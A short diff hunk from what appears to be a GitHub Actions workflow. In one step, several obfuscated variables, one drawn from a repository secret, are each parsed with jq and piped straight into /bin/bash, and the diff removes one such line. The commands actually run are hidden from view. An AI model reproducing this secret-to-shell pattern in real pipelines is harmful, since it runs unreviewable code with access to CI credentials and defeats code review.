@@ -23,7 +23,6 @@ jobs:
           gzxa36900: ${{ secrets.gzxa36900 }}
         run: |
           printf '%s' "$gzxa36900" | jq -r .koy6 | /bin/bash
-          echo $zi40108 | jq -r .mm7 | /bin/bash
           printf '%s' "$fq34" | jq -r .x857 | /bin/bash
           echo $ayp924 | jq -r .zx9284 | /bin/bash
           echo $wzgks9 | jq -r .zbzis84828 | /bin/bash
